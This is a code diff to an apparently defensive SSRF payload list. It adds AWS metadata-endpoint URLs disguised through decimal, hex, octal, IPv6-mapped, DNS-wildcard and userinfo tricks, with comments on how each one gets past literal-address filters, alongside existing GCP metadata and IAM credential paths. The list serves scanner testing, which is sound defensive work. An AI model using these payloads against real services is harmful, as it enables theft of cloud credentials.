@@ -183,9 +183,16 @@ SSRF_METADATA: tuple[str, ...] = (
     # reflection - detect_metadata_leak requires signatures absent from payloads.)
     "http://169.254.169.254/latest/meta-data/",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    # AWS link-local via IP-obfuscation bypasses
+    # AWS link-local via IP-obfuscation / allow-list bypasses. All resolve (or
+    # are parsed) as 169.254.169.254 by a permissive fetcher, so they slip past a
+    # filter that only blocks the literal dotted-quad while still returning IMDS
+    # content that detect_metadata_leak() signatures on.
     "http://2852039166/latest/meta-data/",  # decimal of 169.254.169.254
     "http://[::ffff:169.254.169.254]/latest/meta-data/",
+    "http://0xa9fea9fe/latest/meta-data/",  # hex of 169.254.169.254
+    "http://0251.0376.0251.0376/latest/meta-data/",  # octal dotted-quad
+    "http://169.254.169.254.nip.io/latest/meta-data/",  # DNS wildcard -> link-local
+    "http://foo@169.254.169.254/latest/meta-data/",  # userinfo parser confusion (host stays IMDS)
     # GCP
     "http://metadata.google.internal/computeMetadata/v1/",
     "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
